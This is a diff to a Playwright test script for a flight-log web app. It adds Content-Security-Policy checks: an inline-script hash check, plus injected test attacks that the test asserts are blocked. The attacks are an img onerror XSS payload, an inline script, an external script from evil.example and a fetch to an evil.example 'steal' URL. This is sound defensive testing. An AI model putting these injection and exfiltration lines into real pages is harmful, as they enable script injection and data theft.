@@ -2,6 +2,7 @@
    Uso:  node tests/run.mjs        (dalla cartella principale; serve Playwright: npm i -g playwright)
    Avvia un piccolo server locale, apre l'app e verifica i casi sui file di esempio. Esce con codice 1 se qualcosa fallisce. */
 import { createRequire } from "module";
+import crypto from "crypto";
 import http from "http"; import fs from "fs"; import path from "path"; import { fileURLToPath } from "url";
 const require = createRequire(process.env.PW_PATH || "/opt/node22/lib/node_modules/");
 const { chromium } = require("playwright");
@@ -14,11 +15,16 @@ const url = "http://localhost:" + srv.address().port + "/";
 const E = p => path.join(root, "esempi", p);
 let fails = 0; const ok = (c, m) => { console.log((c ? "  ok   " : "  FAIL ") + m); if (!c) fails++; };
 
+// CSP: l'hash dello script inline nella meta deve essere quello attuale (altrimenti l'app resta vuota)
+{ const html = fs.readFileSync(path.join(root, "index.html"), "utf8"); const sc = html.match(/<script>([\s\S]*?)<\/script>/)[1];
+  const h = "sha256-" + crypto.createHash("sha256").update(sc, "utf8").digest("base64");
+  console.log("CSP"); ok(html.includes("'" + h + "'"), "hash dello script aggiornato (se fallisce: python3 tools/csp.py)"); }
 const b = await chromium.launch(); const p = await b.newPage({ viewport: { width: 1400, height: 1000 } });
 const errs = []; p.on("pageerror", e => errs.push(e.message)); p.on("dialog", d => { errs.push("dialog: " + d.message().slice(0, 50)); d.accept(); });
 const fresh = async () => { await p.goto(url); await p.waitForTimeout(400); };
 const load = async files => { await p.setInputFiles("#file", files); await p.waitForTimeout(1500); };
 const text = async sel => (await p.textContent(sel)).replace(/\s+/g, " ");
+await p.addInitScript(() => document.addEventListener("securitypolicyviolation", e => (window.__v = window.__v || []).push(e.violatedDirective + " | " + e.blockedURI)));
 await p.goto(url); await p.waitForTimeout(400);
 
 console.log("NMEA (SM GPS)");
@@ -69,6 +75,16 @@ await p.click("text=Archivio"); await p.waitForTimeout(500);
 ok(/Miglior volo registrato: \d+/.test(await text("#arBest")), "miglior volo registrato mostrato");
 ok(!(await p.locator("#tdCard").isHidden()), "grafico andamento visibile con 2 voli");
 
+const viol = await p.evaluate(() => window.__v || []);
+ok(viol.length === 0, "nessuna violazione della CSP nell'uso normale" + (viol.length ? ": " + viol.join(" | ") : ""));
+await p.evaluate(() => { window.__v = []; window.__pwn = 0;
+  document.body.insertAdjacentHTML("beforeend", '<img src=x onerror="window.__pwn=1">');
+  const s = document.createElement("script"); s.textContent = "window.__pwn=2"; document.body.appendChild(s);
+  const e = document.createElement("script"); e.src = "https://evil.example/x.js"; document.body.appendChild(e);
+  fetch("https://evil.example/steal").catch(() => {}); });
+await p.waitForTimeout(500);
+ok((await p.evaluate(() => window.__pwn)) === 0, "CSP: gestore inline e script iniettato non vengono eseguiti");
+ok((await p.evaluate(() => window.__v)).length >= 3, "CSP: blocca script inline, script esterno e richieste verso altri siti");
 ok(errs.length === 0, "nessun errore JavaScript" + (errs.length ? ": " + errs.join(" | ") : ""));
 await b.close(); srv.close();
 console.log(fails ? `\n${fails} test FALLITI` : "\nTutti i test superati"); process.exit(fails ? 1 : 0);
